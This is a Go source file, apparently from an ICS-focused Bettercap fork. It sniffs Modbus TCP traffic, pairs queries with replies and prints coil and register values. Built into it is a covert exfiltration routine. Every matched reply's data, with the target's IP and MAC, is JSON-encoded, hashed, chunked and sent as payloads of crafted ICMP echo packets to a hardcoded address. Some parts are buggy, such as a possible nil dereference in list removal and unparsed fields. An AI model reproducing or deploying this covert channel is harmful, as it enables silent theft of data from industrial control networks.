package net_sniff

import (
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strconv"
	"strings"
	"time"

	//"github.com/biero-el-corridor/Bettercap_ICS/modules/exfiltrations"

	"github.com/biero-el-corridor/Bettercap_ICS/packets"
	"github.com/biero-el-corridor/Bettercap_ICS/session"
	"github.com/evilsocket/islazy/tui"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	//"golang.org/x/text/cases"
	// call the exfiltrations sections.
)

// //////////////////////////
// // start ICMP exfiltrations sections
// //////////////////////////
var (
	//device       string session.I.Interface.Hostname
	snapshot_len int32 = 1024
	promiscuous  bool  = true
	err          error
	timeout      time.Duration = 30 * time.Second
	handle       *pcap.Handle
)

func randomHex(n int) (string, error) {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}

func shape_exfil_data(data []byte) {

	var exfil = exfil_data{}
	//fmt.Println("data1 string = ", data)
	//fmt.Println("md51 string = ", md5.Sum(data))
	md5 := md5.Sum(data)
	exfil.DATA = data
	exfil.MD5 = md5

	//fmt.Println("data2 string = ", data)
	//fmt.Println("md52 string = ", md5)
	interm, err := json.Marshal(exfil)
	if err != nil {
		fmt.Println("")
	}
	// last encoding for not send in clear text
	// no cyphering for now onlly hex value encoding
	final, err := json.Marshal(interm)
	if err != nil {
		fmt.Println("")
	}

	// need to segment the packet into 32 bit chunk

	nb_packet := (len(final) / 32) + 1

	end_block := 0
	for nb_packet != 0 {
		if nb_packet == 1 {
			exil_icmp_echo(final[end_block:])
		} else {
			end_block += 31
			exil_icmp_echo(final[(end_block - 31):end_block])
		}
		nb_packet = nb_packet - 1
	}

}

func exil_icmp_echo(exfil_array []byte) {

	//session.I.Interface.Hostname
	device := session.I.Interface.Hostname
	// Open device
	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// add a functions to modify mac address
	ethernetLayer := &layers.Ethernet{ // https://pkg.go.dev/github.com/google/gopacket@v1.1.19/layers#Ethernet.EthernetType
		SrcMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
		DstMAC:       net.HardwareAddr{0x4C, 0xE7, 0x05, 0x10, 0x22, 0xA3},
		EthernetType: 0x0800,
	}

	ipLayer := &layers.IPv4{ // https://pkg.go.dev/github.com/google/gopacket@v1.1.19/layers#IPv4
		Version:  4,
		IHL:      uint8(5),
		TOS:      0,
		Length:   40,
		Id:       28829,
		Flags:    2,
		Protocol: layers.IPProtocolICMPv4,
		TTL:      64,
		Checksum: 0,
		SrcIP:    net.IP{169, 254, 0, 6},
		DstIP:    net.IP{169, 254, 0, 5},
	}

	// add a element to mofify the ID sections
	//note the icmp packet is not the same on windows and linux
	// the linux ICMP have a timestamp the windows does not
	icmpLayer := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(uint8(8), uint8(0)),
		Seq:      1, // avoir un roulement au niveaux de l'indicateur.
		Id:       3177,
	}

	////////////////////////
	///// TCP Sections
	///////////////////////
	//buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	////////////////////////
	///// ICMP Sections
	///////////////////////
	// And create the packet with the layers
	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer,
		options,
		ethernetLayer,
		ipLayer,
		icmpLayer,
		gopacket.Payload(exfil_array),
	)
	///////////////////
	/// packet sending
	///////////////////
	//fmt.Println("data string value : ", exfil_array)

	err = handle.WritePacketData(buffer.Bytes())
	if err != nil {
		log.Fatal(err)
	}
}

////////////////////////////
//// end ICMP exfiltrations sections
////////////////////////////

////////////////////////////
//// start sections to add in packets/modbus.go
////////////////////////////

type combined_req_rep_fc_1_or_2 struct {
	QUERY_DST_MAC []byte                                     `json:"QUERY_DST_MAC"`
	QUERY_IP_DST  string                                     `json:"QUERY_IP_DST"`
	QUERY         packets.Modbus_FUNCTIONS_CODE_1_OR_2_query `json:"QUERY"`
	REPLY         packets.Modbus_FUNCTIONS_CODE_1_OR_2_reply `json:"REPLY"`
}

type combined_req_rep_fc_3_or_4 struct {
	QUERY_DST_MAC []byte                                     `json:"QUERY_DST_MAC"`
	QUERY_IP_DST  string                                     `json:"QUERY_IP_DST"`
	QUERY         packets.Modbus_FUNCTIONS_CODE_3_OR_4_query `json:"QUERY"`
	REPLY         packets.Modbus_FUNCTIONS_CODE_3_OR_4_reply `json:"REPLY"`
}

// the packet structure  between req and reply is the same
// so dont need to define a reply structure
type combined_req_rep_fc_5_or_6 struct {
	QUERY_DST_MAC []byte                                     `json:"QUERY_DST_MAC"`
	QUERY_IP_DST  string                                     `json:"QUERY_IP_DST"`
	QUERY         packets.Modbus_FUNCTIONS_CODE_5_OR_6_query `json:"QUERY"`
	REPLY         packets.Modbus_FUNCTIONS_CODE_5_OR_6_query `json:"REPLY"`
}

type exfil_data struct {
	MD5  [16]byte `json:"MD5"`
	DATA []byte   `json:"DATA"`
}

////////////////////////////
//// end sections to add in packets/modbus.go
////////////////////////////

// Declare global
var list = &List{}
var a = 0

func byte_decimal_array_to_decimal_uint16(array []byte) uint16 {
	//	because I get decimal value in each array
	//	I need to convert to hex concat and then convert to decimal.
	byteArray := array
	hexadecimal_num := hex.EncodeToString(byteArray)
	//fmt.Println("Encoded Hex String: ", hexadecimal_num)
	//fmt.Println("/////// Encoded Hex String: ", hexadecimal_num)
	// use the parseInt() function to convert
	decimal_num, err := strconv.ParseInt(hexadecimal_num, 16, 64)
	decimal_value := uint16(decimal_num)

	// in case of any error
	if err != nil {
		panic(err)
	}
	return decimal_value
}

// debug PoC funtions
// get the byte array from the TCP payload sections from the net_sniff_modbus_tcp.go
func viewModbusTCPEvent(modbus []byte) packets.ModbusTCP_struct {
	// structure of the current modbusTCP sections of the packet
	ModbusTCP_currentPacket := packets.ModbusTCP_struct{
		TID:    byte_decimal_array_to_decimal_uint16(modbus[0:2]),
		Lenght: uint16(modbus[4])*1000 + uint16(modbus[5]),
		UID:    uint8(modbus[6]),
	}
	return ModbusTCP_currentPacket
}

///////////////////////////////////////////////////
// start of the linked list section  //////////////
///////////////////////////////////////////////////

/*
Due to the fact that there may be overlapping packets in the order of arrival.
We need to create a paradigm where queries are stored while waiting for their response.

We do this via a chained list, stopping the source port and TCP payload of the query
then place it in a list.

When we receive a response, we retrieve its destination port, go through the list
and if its port matches, we retrieve the value, and delete its node from the list
*/
//	Node definition
type Node struct {
	dst_mac     []byte
	dst_ip      string
	src_port    string
	tcp_payload []byte
	next        *Node
}

// Chain definition
type List struct {
	head *Node
}

// Add node to chain
func (l *List) add(dstMac []byte, dstIP string, value string, TCP_payload []byte) {
	newNode := &Node{dst_mac: dstMac, dst_ip: dstIP, src_port: value, tcp_payload: TCP_payload}
	if l.head == nil {
		l.head = newNode
		return
	}
	curr := l.head
	for curr.next != nil {
		curr = curr.next
	}
	curr.next = newNode
}

// Delete node from chain
func (l *List) remove(value string) {
	//var wanted_modbus_payload []byte

	//	End of the chain
	if l.head == nil {
	}
	if l.head.src_port == value {
		//wanted_modbus_payload = l.head.tcp_payload
		//fmt.Printf("the query for the current reply : ", l.head.src_port)
		l.head = l.head.next
	}
	curr := l.head
	for curr.next != nil && curr.next.src_port != value {
		curr = curr.next
	}
	//wanted_modbus_payload = l.head.tcp_payload
	if curr.next != nil {
		curr.next = curr.next.next
	}

}

// retrieve the stored query
func get_stored_query(l *List, val string) ([]byte, string, []byte) {
	curr := l.head
	var mac_dst []byte
	var tcp_p []byte
	var ip_dst string
	//	Note that the query cannot be analyze in the loop if it is empty
	if val == "" {
		fmt.Println("empty line found")
		return nil, "", nil
	}

	for curr != nil {
		//fmt.Println("value of the port in the linked list", curr.src_port)

		if curr.src_port == val {
			mac_dst = curr.dst_mac
			tcp_p = curr.tcp_payload
			ip_dst = curr.dst_ip
			//fmt.Println("\n value to exprot and delet")
			//fmt.Println("\n src port ", curr.src_port)
			//fmt.Println("tcp payload", curr.tcp_payload)
			return mac_dst, ip_dst, tcp_p
		}
		curr = curr.next
	}
	return mac_dst, ip_dst, tcp_p
}

// print the linked list node by node
func printList(l *List) {
	curr := l.head
	//fmt.Println("value of cur ", curr, "\n")
	for curr != nil {
		//fmt.Println("\nrc port ", curr.src_port)
		//fmt.Println("tcp payload", curr.tcp_payload)
		curr = curr.next
	}
	fmt.Println()
}

///////////////////////////////////////////////////
// end of the linked list section  ////////////////
///////////////////////////////////////////////////

// Add Source / Destination ports
func modbusTcpParser(srcIP, dstIP net.IP, payload []byte, pkt gopacket.Packet, tcp *layers.TCP) bool {

	// print the interface name.
	//fmt.Println("from the modbus call :", session.I.Interface.Hostname)

	//exfiltration.exfil

	// define the list for the linked list
	//list := &List{}
	//var Is_query = false
	//var Is_reply = false
	ethLayer := pkt.Layer(layers.LayerTypeEthernet)
	modbus := pkt.TransportLayer().LayerPayload()
	transportlayer := pkt.TransportLayer()
	ethPacket, _ := ethLayer.(*layers.Ethernet)

	//packets.PrintStuff()
	ip_tcp := transportlayer.(*layers.TCP)

	dstPORT := ip_tcp.DstPort.String()
	srcPORT := ip_tcp.SrcPort.String()

	//fmt.Print("source port : ", dstPORT)
	//fmt.Print("source port : ", srcPORT, "\n")

	ModbusTCP_currentPacket := viewModbusTCPEvent(modbus)
	//FunctionsCode := modbus[7]
	// define if this is a query or a reply
	// query
	if strings.Contains(dstPORT[0:4], "502(") && ModbusTCP_currentPacket.PID == uint16(0) {
		//Is_query = true
		//Is_reply = false
		// try to add dstip to add in the linked list to export it
		var mac []byte = ethPacket.DstMAC
		//fmt.Println("this is the dstmac type :", mac)
		list.add(mac, dstIP.String(), srcPORT[0:5], modbus)

	}
	//	Reply
	if strings.Contains(srcPORT[0:4], "502(") && ModbusTCP_currentPacket.PID == uint16(0) {
		//Is_reply = true
		//Is_query = false
		query_dst_mac, quesy_dst_ip, query_payload := get_stored_query(list, dstPORT[0:5])
		//fmt.Println("value of the query_dst_mac afted node", query_dst_mac)
		//reply_payload := modbus
		if query_payload != nil {
			//fmt.Println("\nquery paylaods : ", query_payload)
			//fmt.Println("reply paylaods : ", modbus)
			// real zone , in this time we have the query and the reply
			FunctionsCode := modbus[7]

			fmt.Println("function code detected: ", FunctionsCode)
			switch FunctionsCode {
			case packets.READ_COILS:
				if uint16(modbus[9]) != uint16(2) {
					query, reply := packets.VIEW_FUNCTIONS_CODE_1_OR_2(query_payload[7:], modbus[7:])
					fmt.Println("\n ////////////////////////")
					fmt.Println("modbus")
					fmt.Println(srcIP)
					fmt.Println(dstIP)
					fmt.Println("/////")
					fmt.Println(" ModbusTCP")

					fmt.Println("	TID = ", ModbusTCP_currentPacket.TID)
					fmt.Println("	PID = ", ModbusTCP_currentPacket.PID)
					fmt.Println("	Lenght = ", ModbusTCP_currentPacket.Lenght)
					fmt.Println("	UID = ", ModbusTCP_currentPacket.UID)
					fmt.Println("/////")
					fmt.Println(" Modbus query")
					fmt.Println("	Functions code = ", query.FUNCTION_CODE, " READ_COIL")
					fmt.Println("	Reference Number = ", query.REFERENCE_NUMBER)
					fmt.Println("	Bit count = ", query.BITE_COUNT)
					fmt.Println("/////")
					fmt.Println(" Modbus reply")
					fmt.Println("	Functions code = ", reply.FUNCTION_CODE)
					// print the value of the data byte value
					// counter for the number of byte to do
					for key, value := range reply.DATA {
						fmt.Println("coil number :", key, " || Value:", value)
					}

					////////////////////////////////////////////////////
					//// sart  sections to format and exfiltrate data
					////////////////////////////////////////////////////
					// define the global structure of the exfiltred data.
					var query_resp = combined_req_rep_fc_1_or_2{}
					//var exfil = exfil_data{}

					query_resp.QUERY_DST_MAC = query_dst_mac
					query_resp.QUERY_IP_DST = quesy_dst_ip
					query_resp.QUERY = query
					query_resp.REPLY = reply

					// will convert to byte
					data, err := json.Marshal(query_resp)
					if err != nil {
						fmt.Println("")

					}

					shape_exfil_data(data)
					////////////////////////////////////////////////////
					//// sart  sections to format and exfiltrate data
					////////////////////////////////////////////////////

				} else {
					fmt.Println("Exeption code: Illegal data address")
				}
				//fmt.Println("data requested", modbus[9:])
			case packets.READ_COIL_EXEPTION:
				fmt.Println("entering the error handeling")
				//read_coil_exeptions, reply := viewModbusTCPEvent(modbus[])
				fmt.Println("\n ////////////////////////")
				fmt.Println("modbus")
				fmt.Println(srcIP)
				fmt.Println(dstIP)
				fmt.Println("/////")
				fmt.Println(" ModbusTCP")
				fmt.Println("	TID = ", ModbusTCP_currentPacket.TID)
				fmt.Println("	PID = ", ModbusTCP_currentPacket.PID)
				fmt.Println("	Lenght = ", ModbusTCP_currentPacket.Lenght)
				fmt.Println("	UID = ", ModbusTCP_currentPacket.UID)

				fmt.Println("ERROR HANDELING : EXEPTIONS CODE :", modbus[8:], "on functions code :", packets.READ_COILS)
			case packets.READ_DISCRETE_INPUTS:
				if uint16(modbus[9]) != uint16(2) {
					query, reply := packets.VIEW_FUNCTIONS_CODE_1_OR_2(query_payload[7:], modbus[7:])
					fmt.Println("\n ////////////////////////")
					fmt.Println("modbus")
					fmt.Println(srcIP)
					fmt.Println(dstIP)
					fmt.Println("/////")
					fmt.Println(" ModbusTCP")
					fmt.Println("	TID = ", ModbusTCP_currentPacket.TID)
					fmt.Println("	PID = ", ModbusTCP_currentPacket.PID)
					fmt.Println("	Lenght = ", ModbusTCP_currentPacket.Lenght)
					fmt.Println("	UID = ", ModbusTCP_currentPacket.UID)
					fmt.Println("/////")
					fmt.Println(" Modbus query")
					fmt.Println("	Functions code = ", query.FUNCTION_CODE, " READ_COIL")
					fmt.Println("	Reference Number = ", query.REFERENCE_NUMBER)
					fmt.Println("	Bit count = ", query.BITE_COUNT)
					fmt.Println("/////")
					fmt.Println(" Modbus reply")
					fmt.Println("	Functions code = ", reply.FUNCTION_CODE)

					// print the value of the data byte value
					// counter for the number of byte to analyze
					for key, value := range reply.DATA {
						fmt.Println("coil number :", key, " || Value:", value)
					}

					////////////////////////////////////////////////////
					//// sart  sections to format and exfiltrate data
					////////////////////////////////////////////////////
					// define the global structure of the exfiltred data.
					var query_resp = combined_req_rep_fc_1_or_2{}
					//var exfil = exfil_data{}
					query_resp.QUERY_DST_MAC = query_dst_mac
					query_resp.QUERY_IP_DST = quesy_dst_ip
					query_resp.QUERY = query
					query_resp.REPLY = reply
					// will convert to byte
					data, err := json.Marshal(query_resp)
					if err != nil {
						fmt.Println("")
					}
					shape_exfil_data(data)
					////////////////////////////////////////////////////
					//// sart  sections to format and exfiltrate data
					////////////////////////////////////////////////////
				} else {
					fmt.Println("Exeption code: Illegal data address")
				}
				//fmt.Println("data requested : ", modbus[9:])
			// functions code 3 , same concept as the read coil , but with register instead of coil.
			case packets.READ_MULTIPLE_HOLDING_REGISTERS:
				//fmt.Println("read multiple haloding register entering functions")
				query, reply := packets.VIEW_FUNCTIONS_CODE_3_OR_4(query_payload[7:], modbus[7:])

				//read_coil, reply := VIEW_FUNCTIONS_CODE_1_OR_2(query_payload[7:], modbus[7:])
				fmt.Println("\n ////////////////////////")
				fmt.Println("\n modbus")
				fmt.Println(srcIP)
				fmt.Println(dstIP)
				fmt.Println("/////")
				fmt.Println(" ModbusTCP")
				fmt.Println("TID = ", ModbusTCP_currentPacket.TID)
				fmt.Println("PID = ", ModbusTCP_currentPacket.PID)
				fmt.Println("Lenght = ", ModbusTCP_currentPacket.Lenght)
				fmt.Println("UID = ", ModbusTCP_currentPacket.UID)
				fmt.Println("/////")
				fmt.Println(" Modbus query")
				fmt.Println("Functions code = ", query.FUNCTION_CODE, " READ_MULTIPLE_HOLDING_REGISTERS")
				fmt.Println("Reference Number = ", query.REFERENCE_NUMBER)
				fmt.Println("Word count = ", query.WORD_COUNT)
				fmt.Println("/////")
				fmt.Println(" Modbus reply")
				fmt.Println("Functions code = ", reply.FUNCTION_CODE)
				fmt.Println("Byte count= ", reply.BYTE_COUNT)

				// print the uint16 register
				for key, value := range reply.DATA {
					fmt.Println("register number :", key, " || Value:", value)
				}

				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
				// define the global structure of the exfiltred data.
				var query_resp = combined_req_rep_fc_3_or_4{}
				//var exfil = exfil_data{}
				query_resp.QUERY_DST_MAC = query_dst_mac
				query_resp.QUERY_IP_DST = quesy_dst_ip
				query_resp.QUERY = query
				query_resp.REPLY = reply
				// will convert to byte
				data, err := json.Marshal(query_resp)
				if err != nil {
					fmt.Println("")
				}
				shape_exfil_data(data)
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////

			case packets.READ_INPUT_REGISTERS:
				query, reply := packets.VIEW_FUNCTIONS_CODE_3_OR_4(query_payload[7:], modbus[7:])
				//read_coil, reply := VIEW_FUNCTIONS_CODE_1_OR_2(query_payload[7:], modbus[7:])
				fmt.Println("\n ////////////////////////")
				fmt.Println("\n modbus")
				fmt.Println(srcIP)
				fmt.Println(dstIP)
				fmt.Println("/////")
				fmt.Println(" ModbusTCP")
				fmt.Println("TID = ", ModbusTCP_currentPacket.TID)
				fmt.Println("PID = ", ModbusTCP_currentPacket.PID)
				fmt.Println("Lenght = ", ModbusTCP_currentPacket.Lenght)
				fmt.Println("UID = ", ModbusTCP_currentPacket.UID)
				fmt.Println("/////")
				fmt.Println(" Modbus query")
				fmt.Println("Functions code = ", query.FUNCTION_CODE, " READ_IMPUT_REGISTERS")
				fmt.Println("Reference Number = ", query.REFERENCE_NUMBER)
				fmt.Println("Word count = ", query.WORD_COUNT)
				fmt.Println("/////")
				fmt.Println(" Modbus reply")
				fmt.Println("Functions code = ", reply.FUNCTION_CODE)
				fmt.Println("Byte count= ", reply.BYTE_COUNT)
				// print the uint16 register
				for key, value := range reply.DATA {
					fmt.Println("register number :", key, " || Value:", value)
				}
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
				// define the global structure of the exfiltred data.
				var query_resp = combined_req_rep_fc_3_or_4{}
				//var exfil = exfil_data{}
				query_resp.QUERY_DST_MAC = query_dst_mac
				query_resp.QUERY_IP_DST = quesy_dst_ip
				query_resp.QUERY = query
				query_resp.REPLY = reply
				// will convert to byte
				data, err := json.Marshal(query_resp)
				if err != nil {
					fmt.Println("")
				}
				shape_exfil_data(data)
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////

			case packets.WRITE_SINGLE_HOLDING_REGISTER:
				write_signle_holding_register := packets.VIEW_FUNCTIONS_CODE_5_OR_6(modbus[7:])
				NewSnifferEvent(
					pkt.Metadata().Timestamp,
					"modbus",
					srcIP.String(),
					dstIP.String(),
					ModbusTCP_currentPacket,
					"%s %s %s %s %s %s %s %s %s%s %s %s %s",
					tui.Red("\n ModbusTCP"),
					tui.Yellow("\nTID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.TID), 10)),
					tui.Yellow("\nPID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.PID), 10)),
					tui.Yellow("\nLenght = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.Lenght), 10)),
					tui.Yellow("\nUID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.UID), 10)),
					tui.Red("\n Modbus Query"),
					tui.Yellow("\nFunctions code = "+strconv.FormatUint(uint64(write_signle_holding_register.FUNCTION_CODE), 10)+" WRITE_SINGLE_HOLDING_REGISTER"),
					tui.Yellow("\nReference Number = "+strconv.FormatUint(uint64(write_signle_holding_register.REFERENCE_NUMBER), 10)),
					tui.Yellow("\nData = "+strconv.FormatUint(uint64(write_signle_holding_register.DATA), 10)),
					tui.Red("\n Modbus reply"),
					tui.Yellow("\nFunctions code = "+strconv.FormatUint(uint64(write_signle_holding_register.FUNCTION_CODE), 10)+" WRITE_SINGLE_HOLDING_REGISTER"),
					tui.Yellow("\nReference Number = "+strconv.FormatUint(uint64(write_signle_holding_register.REFERENCE_NUMBER), 10)),
					tui.Yellow("\nData = "+strconv.FormatUint(uint64(write_signle_holding_register.DATA), 10)),
				).Push()
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
				// define the global structure of the exfiltred data.
				var query_resp = combined_req_rep_fc_5_or_6{}
				//var exfil = exfil_data{}
				query_resp.QUERY_DST_MAC = query_dst_mac
				query_resp.QUERY_IP_DST = quesy_dst_ip
				query_resp.QUERY = write_signle_holding_register
				query_resp.REPLY = write_signle_holding_register
				// will convert to byte
				data, err := json.Marshal(query_resp)
				if err != nil {
					fmt.Println("")
				}
				shape_exfil_data(data)
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
			case packets.WRITE_SINGLE_COIL:
				write_signle_coil := packets.VIEW_FUNCTIONS_CODE_5_OR_6(modbus[7:])
				NewSnifferEvent(
					pkt.Metadata().Timestamp,
					"modbus",
					srcIP.String(),
					dstIP.String(),
					ModbusTCP_currentPacket,
					"%s %s %s %s %s %s %s %s %s %s %s %s %s",
					tui.Red("\n ModbusTCP"),
					tui.Yellow("\nTID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.TID), 10)),
					tui.Yellow("\nPID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.PID), 10)),
					tui.Yellow("\nLenght = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.Lenght), 10)),
					tui.Yellow("\nUID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.UID), 10)),
					tui.Red("\n Modbus Query"),
					tui.Yellow("\nFunctions code = "+strconv.FormatUint(uint64(write_signle_coil.FUNCTION_CODE), 10)+" WRITE_SINGLE_COIL"),
					tui.Yellow("\nReference Number = "+strconv.FormatUint(uint64(write_signle_coil.REFERENCE_NUMBER), 10)),
					tui.Yellow("\nData = "+strconv.FormatUint(uint64(write_signle_coil.DATA), 10)),
					tui.Red("\n Modbus reply"),
					tui.Yellow("\nFunctions code = "+strconv.FormatUint(uint64(write_signle_coil.FUNCTION_CODE), 10)+" WRITE_SINGLE_COIL"),
					tui.Yellow("\nReference Number = "+strconv.FormatUint(uint64(write_signle_coil.REFERENCE_NUMBER), 10)),
					tui.Yellow("\nData = "+strconv.FormatUint(uint64(write_signle_coil.DATA), 10)),
				).Push()
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
				// define the global structure of the exfiltred data.
				var query_resp = combined_req_rep_fc_5_or_6{}
				//var exfil = exfil_data{}
				query_resp.QUERY_DST_MAC = query_dst_mac
				query_resp.QUERY_IP_DST = quesy_dst_ip
				query_resp.QUERY = write_signle_coil
				query_resp.REPLY = write_signle_coil
				// will convert to byte
				data, err := json.Marshal(query_resp)
				if err != nil {
					fmt.Println("")
				}
				shape_exfil_data(data)
				////////////////////////////////////////////////////
				//// sart  sections to format and exfiltrate data
				////////////////////////////////////////////////////
			case 7, 8, 9, 10, 11, 12, 13, 14, 15:
				NewSnifferEvent(
					pkt.Metadata().Timestamp,
					"modbusTCP",
					srcIP.String(),
					dstIP.String(),
					ModbusTCP_currentPacket,
					"%s %s %s %s %s %s",
					tui.Red("\n ModbusTCP reply"),
					tui.Yellow("\nTID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.TID), 10)),
					tui.Yellow("\nPID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.PID), 10)),
					tui.Yellow("\nLenght = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.Lenght), 10)),
					tui.Yellow("\nUID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.UID), 10)),
					tui.Red("\n Modbus Functions not implemented yet"),
				)
			default:
				NewSnifferEvent(
					pkt.Metadata().Timestamp,
					"modbusTCP",
					srcIP.String(),
					dstIP.String(),
					ModbusTCP_currentPacket,
					"%s %s %s %s %s %s",
					tui.Red("\n ModbusTCP reply"),
					tui.Yellow("\nTID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.TID), 10)),
					tui.Yellow("\nPID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.PID), 10)),
					tui.Yellow("\nLenght = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.Lenght), 10)),
					tui.Yellow("\nUID = "+strconv.FormatUint(uint64(ModbusTCP_currentPacket.UID), 10)),
					tui.Red("\n Modbus Functions not Documented"),
				)
			}

		}
		list.remove(dstPORT[0:5])

	}
	return true
}
